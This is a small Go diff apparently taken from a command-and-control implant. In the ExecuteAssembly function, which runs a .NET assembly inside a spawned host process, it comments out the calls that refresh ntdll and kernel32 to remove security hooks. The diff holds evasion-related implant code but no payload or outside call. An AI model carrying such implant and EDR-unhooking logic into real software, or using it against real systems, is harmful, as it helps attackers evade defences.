@@ -360,14 +360,14 @@ func LocalTask(data []byte, rwxPages bool) error {
 }
 
 func ExecuteAssembly(hostingDll, assembly []byte, process, params string, timeout int32) (string, error) {
-	err := RefreshPE(ntdllPath)
-	if err != nil {
-		return "", err
-	}
-	err = RefreshPE(kernel32dllPath)
-	if err != nil {
-		return "", err
-	}
+	// err := RefreshPE(ntdllPath)
+	// if err != nil {
+	// 	return "", err
+	// }
+	// err = RefreshPE(kernel32dllPath)
+	// if err != nil {
+	// 	return "", err
+	// }
 	// {{if .Debug}}
 	log.Println("[*] Assembly size:", len(assembly))
 	log.Println("[*] Hosting dll size:", len(hostingDll))
@@ -384,7 +384,7 @@ func ExecuteAssembly(hostingDll, assembly []byte, process, params string, timeou
 	stderrIn, _ := cmd.StderrPipe()
 
 	var errStdout, errStderr error
-	err = cmd.Start()
+	err := cmd.Start()
 	if err != nil {
 		//{{if .Debug}}
 		log.Println("Could not start process:", process)
